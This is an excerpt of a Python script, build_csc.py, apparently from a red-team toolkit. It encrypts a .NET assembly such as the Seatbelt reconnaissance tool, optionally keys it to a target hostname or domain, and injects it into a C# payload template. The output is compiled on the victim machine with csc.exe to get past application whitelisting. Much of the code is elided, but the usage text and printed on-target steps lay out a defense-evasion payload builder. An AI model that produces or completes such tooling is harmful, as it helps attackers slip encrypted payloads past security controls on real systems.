#!/usr/bin/env python3
"""
build_csc.py -- Encrypts a .NET assembly and injects into csc_payload.cs

Generates a standalone C# file to compile on-target with csc.exe.
Unlike InstallUtil/RegAsm, the output is an EXE — no DLL registration needed.

Usage:
  python build_csc.py <assembly_path> [options] [-- <assembly_args>...]

Examples:
  python build_csc.py Seatbelt.exe -- -group=all
  python build_csc.py Seatbelt.exe -e xor -- -group=all
  python build_csc.py Seatbelt.exe --keying hostname=WS01,domain=CORP -- -group=all
  python build_csc.py MyLib.dll --type Namespace.Class --method Run
...
def main():
    ...
    parser = argparse.ArgumentParser(
        description="Encrypt a .NET assembly and inject into csc_payload.cs"
    )
    ...
    parser.add_argument("--compile", action="store_true",
                        help="Auto-compile with mcs to payload.exe")
    ...
    exe_path = os.path.splitext(output_path)[0] + ".exe"
    ...
    if args.compile:
        ...
        print(f"[+] Compiled: {exe_path} ({size_kb:.0f} KB)", file=sys.stderr)

    print(f"[*] On target:", file=sys.stderr)
    if args.compile:
        print(f"    {os.path.basename(exe_path)}", file=sys.stderr)
    else:
        print(f"    Compile: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"
              f" /out:payload.exe {os.path.basename(output_path)}", file=sys.stderr)
        print(f"    Run:     payload.exe", file=sys.stderr)
